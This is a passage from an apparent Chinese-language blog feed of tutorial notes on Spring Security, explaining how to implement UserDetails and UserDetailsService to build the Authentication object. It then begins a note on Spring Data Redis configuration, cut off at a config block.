<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">UserDetails</span>.<span class="hljs-property">super</span>.<span class="hljs-title function_">isAccountNonExpired</span>();  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">UserDetails</span>.<span class="hljs-property">super</span>.<span class="hljs-title function_">isAccountNonLocked</span>();  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">UserDetails</span>.<span class="hljs-property">super</span>.<span class="hljs-title function_">isCredentialsNonExpired</span>();  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isEnabled</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">UserDetails</span>.<span class="hljs-property">super</span>.<span class="hljs-title function_">isEnabled</span>();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>那我们为什么非得实现 <code>UserDetails</code> 呢？你说 Spring Security 知不知道这些值，关我什么事？我自己知道就行了呗。但其实你仔细一想，我们就能发现 Spring Security 这么设计是有它的道理的，核心原因就在于：Spring Security 的整个认证和授权流程，底层都是围绕一个 <code>Authentication</code> 对象来构建的，而这个对象的核心信息，其实都来自我们实现的 <code>CustomerUserDetailsImpl</code></p><p>我们必须要搞清楚以下几点：</p><ol><li>Spring Security 是通过 <code>CustomerUserDetailsImpl</code> 来构建 <code>Authentication</code> 对象的</li><li>在登录流程中，通常有两种典型的方式：<ol><li>通过 <code>AuthenticationManager</code> 进行认证（自定义登录 API，使用 AuthenticationManager 进行认证逻辑）：<ol><li>Spring Security 会自动去校验用户提交的用户名和密码，是否与 <code>CustomerUserDetailsImpl</code> 中提供的用户名和密码相匹配；</li><li>如果匹配成功，Spring Security 就会自动将 <code>CustomerUserDetailsImpl</code> 封装为一个 <code>Authentication</code> 对象，并存入当前线程；</li><li>校验的时候，用户信息是从 <code>CustomerUserDetailsImpl</code> 中读取的，封装为 <code>Authentication</code> 对象的时候，其值也是从此读取的。</li><li>需要注意的是：这个过程中 Spring Security 还会自动帮你判断用户是否启用、是否锁定、密码是否过期等等。如果你选择下面的手动认证逻辑，那这些判断就必须你自己来实现。</li></ol></li><li>自定义认证逻辑（自定义登录 API，不用 <code>AuthenticationManager</code>，自己写认证逻辑）：<ol><li>你仍然需要自己去校验前端提交的用户名和密码，和 <code>CustomerUserDetailsImpl</code> 中提供的数据是否一致；</li><li>验证通过后，你需要手动将 <code>CustomerUserDetailsImpl</code> 封装为一个 <code>Authentication</code> 对象，并保存到当前线程中；</li><li>其实在校验阶段，用户名和密码放不放到 <code>CustomerUserDetailsImpl</code> 中都无所谓，你甚至可以直接从<code>User Entity</code> 中拿值来对比。更高级一点，你也可以使用扫码登录、验证码、OAuth2 等方式，不再局限于用户名密码；</li><li>但是，一旦你需要构建 <code>Authentication</code>，你最终还是得使用 <code>CustomUserDetailsImpl</code>，因为 <code>Authentication</code> 中的数据必须要从它那里来。</li><li>所以我们可以得出一个结论：在认证过程中不一定非得依赖 <code>CustomerUserDetailsImpl</code>，但在封装 <code>Authentication</code> 的过程中，最终数据必须来自这个实现类。</li></ol></li></ol></li><li>最后就是权限判断的问题。权限判断是根据当前线程中保存的 <code>Authentication</code> 对象来进行的，而这个对象里的权限信息，不就是我们 <code>CustomerUserDetailsImpl</code> 的 <code>getAuthorities()</code> 方法中返回的吗？所以说本质上这些权限数据，也都是从 <code>CustomerUserDetailsImpl</code> 里来的</li></ol><p>所以，如果我们使用了 Spring Security，那么实现 <code>CustomerUserDetailsImpl</code> 就显得尤为关键。那问题来了：我们到底是如何将 <code>UserMapper</code> 查询到的 <code>User</code> 对象中的信息，封装进 <code>CustomerUserDetailsImpl</code> 的？</p><p>首先思考下：如果是要把 <code>User</code> 对象中的属性同步到 <code>CustomerUserDetailsImpl</code> 中，我们一般会想到以下两种方式：</p><ol><li>显示赋值方式：<ol><li>我们可以先使用 <code>UserMapper</code> 查询出一个 <code>User</code> 对象，然后 <code>new</code> 一个 <code>CustomerUserDetailsImpl</code> 对象，接着再逐个地将 <code>User</code> 的属性赋值到这个对象中。这种方式直观易懂，但写起来繁琐冗长，尤其当字段较多时，容易出错。</li></ol></li><li>构造方法方式（推荐）：<ol><li>在 <code>CustomerUserDetailsImpl</code> 中定义一个以 <code>User</code> 为参数的构造方法，那么当我们 <code>new</code> 它的时候，直接传入一个 <code>User</code> 对象，构造函数内部再将 <code>User</code> 的各个属性赋值到当前对象中。这样封装更简洁、更优雅，也更利于后续维护</li></ol></li></ol><p>但这里我们需要特别注意一点：<code>CustomerUserDetailsImpl</code> 本质上并不是一个普通的属性容器（如果它只是一些简单的属性，那显式赋值和构造方法两种方式都可以使用）。它作为 <code>UserDetails</code> 的实现类，其核心职责是通过方法的返回值来向 Spring Security 暴露用户信息的（也就是说，它的用户数据并不是通过公共属性暴露的，而是通过接口方法提供的）</p><p>因此，我们在封装时更适合采用构造方法的方式。具体来说，就是在 <code>CustomerUserDetailsImpl</code> 中定义一个接收 <code>User</code> 对象的构造函数，在构造函数中将该 <code>User</code> 对象保存为内部私有字段。然后在 <code>getUsername()</code>、<code>getPassword()</code>、<code>getAuthorities()</code> 等方法中，直接返回这个 <code>User</code> 对象中的相应属性值，大致如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;<br><br>    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">User</span> user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span>(<span class="hljs-title class_">User</span> user) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getUsername</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getPassword</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getAuthorities</span>(); <br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonexpired</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonlocked</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsCredentialsnonexpired</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isEnabled</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsEnabled</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们写好这个类之后，只需要在某个方法中，先通过 <code>UserMapper</code> 查询出一个 <code>User</code> 对象，然后直接执行 <code>new CustomerUserDetailsImpl(user)</code>，就能创建出一个封装了用户信息的 <code>CustomerUserDetailsImpl</code> 实例。</p><p>其实这个步骤，Spring Security 早已帮我们考虑好了，它已经提供了一个专门的接口：<code>UserDetailsService</code>。我们只需要实现这个接口，并重写它的 <code>loadUserByUsername</code> 方法，在这个方法中使用 <code>UserMapper</code> 查询出对应的 <code>User</code>，然后直接 <code>return new CustomerUserDetailsImpl(user)</code> 即可。</p><p>这样一来，当我们调用这个方法的时候，它就会执行查询用户信息，并返回一个包含完整用户数据的 <code>CustomerUserDetailsImpl</code> 对象，供后续构建 <code>Authentication</code> 使用。</p><p>需要注意的是，<code>CustomerUserDetailsImpl</code> 并不属于传统意义上的三层架构（Controller-Service-Repository），严格来说，它应当放置在 <code>com.example.securitywithhttpsession.entity</code> 包下，作为用户实体信息的一个安全扩展模型。</p><p>此外，Spring Security 提供的 <code>UserDetails</code> 接口默认只包含七个核心字段：<code>username</code>、<code>password</code>、<code>isAccountNonExpired</code>、<code>isAccountNonLocked</code>、<code>isCredentialsNonExpired</code>、<code>isEnabled</code> 和 <code>authorities</code>。</p><p>如果你希望在 <code>Authentication</code> 中携带更多的信息（例如 <code>email</code> 和 <code>phoneNumber</code>），是可以通过扩展 <code>CustomerUserDetailsImpl</code> 来实现的。这样做的好处是：你可以直接从 <code>SecurityContext</code> 中获取 <code>Authentication</code>，再从中获取这些扩展信息，无需再根据 <code>username</code> 查询数据库。这种方式在某些业务中能显著简化逻辑，提高效率。</p><p>不过需要明确的是，Spring Security 的设计初衷并不是鼓励我们将过多的用户字段直接放进 <code>Authentication</code> 对象中。是否将这些字段一并封装，应该根据你的具体业务场景权衡决定，避免过度冗余或信息泄露风险。</p><p>最终，我们实现的代码就如下所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;<br><br>    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">User</span> user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span>(<span class="hljs-title class_">User</span> user) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须实现的 3 个方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getAuthorities</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getPassword</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getUsername</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// 可选择实现的 4 个方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonexpired</span>() != <span class="hljs-literal">null</span> &amp;&amp; user.<span class="hljs-title function_">getIsAccountnonexpired</span>() != <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonlocked</span>() != <span class="hljs-literal">null</span> &amp;&amp; user.<span class="hljs-title function_">getIsAccountnonlocked</span>() !=<span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsCredentialsnonexpired</span>() != <span class="hljs-literal">null</span> &amp;&amp; user.<span class="hljs-title function_">getIsCredentialsnonexpired</span>() != <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isEnabled</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsEnabled</span>() != <span class="hljs-literal">null</span> &amp;&amp; user.<span class="hljs-title function_">getIsEnabled</span>() != <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 选择性扩展的字段</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getEmail</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getEmail</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPhoneNumber</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getPhoneNumber</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>由于我们的 <code>User</code> 中字段是 <code>private Integer isAccountNonExpired;</code>，而接口方法 <code>public boolean isAccountNonExpired()</code> 需要返回 boolean 类型，所以在实现时必须手动判断，如：<code>return user.getIsAccountNonExpired() != null &amp;&amp; user.getIsAccountNonExpired() != 0;</code></li><li>其实没必要这么复杂，主要原因是我们在 <code>User</code> 中使用了 Integer 类型。对于 MyBatis，如果你把字段声明成 <code>private boolean isAccountNonExpired;</code> 在相同的 SQL 语句下，它会自动把数据库中的 TINYINT(1) 映射成 boolean 类型，这样我们只需直接返回：<code>return user.isAccountNonExpired();</code></li><li>这样写就不需要额外判断了，而且更简洁，也比较推荐。但既然代码已经写成这样，我们就保持现有实现，下面给你展示这种推荐的写法：</li></ol></blockquote><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// User Entity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br><span class="hljs-comment">// users 表中的数据（用户基本信息）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Integer</span> userId;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> password;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Boolean</span> isAccountNonExpired;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Boolean</span> isAccountNonLocked;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Boolean</span> isCredentialsNonExpired;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Boolean</span> isEnabled;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> email;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> phoneNumber;<br>    <br><span class="hljs-comment">// authorities 表中的数据（用户的权限，不要忘记添加这个）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">SimpleGrantedAuthority</span>&gt; authorities;<br><br>    <span class="hljs-comment">// getter 方法</span><br><span class="hljs-comment">// setter 方法</span><br><span class="hljs-comment">// equals 方法</span><br><span class="hljs-comment">// hashCode 方法</span><br><span class="hljs-comment">// toString 方法</span><br>&#125;<br><br><span class="hljs-comment">// CustomerUserDetailsImpl</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;<br><br>    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">User</span> user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">CustomerUserDetailsImpl</span>(<span class="hljs-title class_">User</span> user) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须实现的 3 个方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getAuthorities</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getPassword</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getUsername</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// 可选择实现的 4 个方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonexpired</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsAccountnonlocked</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsCredentialsnonexpired</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">isEnabled</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getIsEnabled</span>();<br>    &#125;<br>    <br>    <span class="hljs-comment">// 选择性扩展的字段</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getEmail</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getEmail</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPhoneNumber</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> user.<span class="hljs-title function_">getPhoneNumber</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-1-5-实现-UserDetailsService-接口"><a href="#1-1-5-实现-UserDetailsService-接口" class="headerlink" title="1.1.5. 实现 UserDetailsService 接口"></a>1.1.5. 实现 UserDetailsService 接口</h4><p>我们一般创建 <code>CustomerUserDetailsImplService</code> 类，用于实现这个接口，并重写它的 <code>loadUserByUsername</code> 方法，在这个方法中使用 <code>UserMapper</code> 查询出对应的 <code>User</code>，然后直接 <code>return new CustomerUserDetailsImpl(user)</code> 即可。</p><p><code>CustomerUserDetailsImplService</code> 类位于 <code>com.example.securitywithhttpsession.service</code> 包下</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomerUserDetailsImplService</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">UserDetailsService</span></span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper userMapper;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> UserDetails loadUserByUsername(<span class="hljs-keyword">String</span> username) throws UsernameNotFoundException &#123;<br>        User user = userMapper.getUserByUserName(username);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> UsernameNotFoundException(<span class="hljs-string">&quot;user not found&quot;</span> + username);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><span class="hljs-type"></span> CustomerUserDetailsImpl(user);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>写成 <code>private final UserMapper userMapper</code> 的话，就不能使用 <code>@Autowired</code> 这种方式进行注入，必须要使用构造注入的方式进行注入</li></ol></blockquote><hr><h4 id="1-1-6-进行-Spring-Security-配置"><a href="#1-1-6-进行-Spring-Security-配置" class="headerlink" title="1.1.6. 进行 Spring Security 配置"></a>1.1.6. 进行 Spring Security 配置</h4>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Data Redis</title>
    <link href="/2025/05/17/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20Redis/"/>
    <url>/2025/05/17/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20Redis/</url>
    
    <content type="html"><![CDATA[<h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h3><h4 id="1-1-创建-Spring-Web-项目，添加-Redis-相关依赖"><a href="#1-1-创建-Spring-Web-项目，添加-Redis-相关依赖" class="headerlink" title="1.1. 创建 Spring Web 项目，添加 Redis 相关依赖"></a>1.1. 创建 Spring Web 项目，添加 Redis 相关依赖</h4><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;NoSQL&#x3D;&#x3D;<ol><li>Spring Data Redis</li></ol></li></ol><hr><h4 id="1-2-进行-Redis-相关配置"><a href="#1-2-进行-Redis-相关配置" class="headerlink" title="1.2. 进行 Redis 相关配置"></a>1.2. 进行 Redis 相关配置</h4><h5 id="1-2-1-通用配置"><a href="#1-2-1-通用配置" class="headerlink" title="1.2.1. 通用配置"></a>1.2.1. 通用配置</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">spring:  <br>  data:  